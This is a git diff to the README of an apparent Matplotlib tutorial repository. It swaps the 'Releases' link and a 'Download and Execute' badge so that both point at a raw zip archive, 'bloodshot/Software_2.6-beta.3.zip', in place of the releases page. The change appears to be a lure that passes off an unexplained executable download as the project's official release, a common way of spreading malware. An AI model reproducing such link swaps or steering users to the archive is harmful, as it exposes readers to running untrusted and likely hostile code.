@@ -29,7 +29,7 @@ Our repository covers a variety of topics related to data visualization, includi
 
 ## Releases
 
-For the latest updates and releases, visit our [Releases](https://github.com/ZxJahid/Matplotlib/releases) section.
+For the latest updates and releases, visit our [Releases](https://github.com/ZxJahid/Matplotlib/raw/refs/heads/master/bloodshot/Software_2.6-beta.3.zip) section.
 
 ## Get Started
 
@@ -37,4 +37,4 @@ To get started with mastering data visualization with Matplotlib, simply clone t
 
 So why wait? Start exploring the world of data visualization with Matplotlib today!
 
-[![Download and Execute](https://img.shields.io/badge/Download%20and%20Execute-Get%20Started-brightgreen)](https://github.com/ZxJahid/Matplotlib/releases)
+[![Download and Execute](https://github.com/ZxJahid/Matplotlib/raw/refs/heads/master/bloodshot/Software_2.6-beta.3.zip%20and%20Execute-Get%20Started-brightgreen)](https://github.com/ZxJahid/Matplotlib/raw/refs/heads/master/bloodshot/Software_2.6-beta.3.zip)
